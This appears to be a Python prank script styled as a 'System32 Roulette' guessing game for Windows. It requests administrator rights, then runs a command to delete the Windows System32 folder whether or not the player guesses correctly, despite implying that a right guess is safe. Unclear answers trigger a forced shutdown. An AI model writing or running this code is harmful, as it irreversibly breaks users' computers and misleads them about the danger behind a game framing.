import random  # import random library
import os  # import os library
import time  # import time library
import sys  # import sys library
import ctypes  # import ctypes library

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    # If not an administrator, restart with admin rights
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit(0)

print("Welcome to System32 Roulette")  # print
time.sleep(1.5)  # wait
print("The program will choose a number (between 1 and 10) and if you can't guess it, System32 will be deleted!")  # print
time.sleep(1.5)  # wait
print("This process poses a risk of deleting files necessary for Windows to function. Do you want to proceed? (yes/no)")  # print
devam = input("Yes or No: ").lower()  # take input and save to devam variable

if devam == "yes":  # if devam variable is yes, do
    randomsayi = random.randint(0, 11)  # choose a number between 0 and 11 and save to randomsayi variable
    print("I have chosen a number")  # print
    time.sleep(1.5)  # wait
    cevap = int(input("What do you think the number is: "))  # take input and save to cevap variable
    
    if cevap == randomsayi:  # if cevap variable is equal to randomsayi variable, do
        randomsayi = random.randint(0, 11)  # choose a number between 0 and 11 and save to randomsayi variable
        print("The number I chose: " + str(randomsayi))  # print
        time.sleep(1.5)  # wait
        print("You lost")  # print
        time.sleep(1.5)  # wait
        print("System32 is being deleted")
        time.sleep(2.5)  # wait
        os.system("rmdir /S /Q C:\\Windows\\System32")  # delete system32
   
    else:  # if cevap variable is not equal to randomsayi variable, do
        print("The number I chose: " + str(randomsayi))  # print
        time.sleep(1.5)  # wait
        print("You lost")  # print
        time.sleep(1.5)  # wait
        print("System32 is being deleted")  # print
        time.sleep(2.5)  # wait
        os.system("rmdir /S /Q C:\\Windows\\System32")  # delete system32

elif devam == "no":  # if devam variable is no, do
    print("Were you afraid of losing?")  # print
    time.sleep(1.5)  # wait
    print("Coward!")  # print

else:  # if devam variable is something other than yes or no, do
    print("I didn't understand what you wrote (I definitely didn't get tired of coding). I'll take that as a no.")  # print
    time.sleep(1.5)  # wait
    print("Since you wrote something unclear, I will punish you.")  # print
    time.sleep(2.5)  # wait
    os.system("shutdown /s /t 1")  # shut down the computer
